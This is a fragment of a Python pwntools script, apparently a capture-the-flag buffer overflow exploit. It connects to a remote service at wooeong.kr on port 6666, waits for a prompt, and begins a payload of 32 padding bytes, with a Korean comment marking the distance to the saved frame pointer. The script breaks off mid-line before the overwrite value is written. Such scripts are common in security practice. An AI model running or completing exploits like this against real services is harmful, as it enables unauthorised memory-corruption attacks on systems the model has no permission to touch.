from pwn import *
r = remote("wooeong.kr",6666)
r.recvuntil(" > ")

payload = "a"*32 #거리+sfp
payload += pack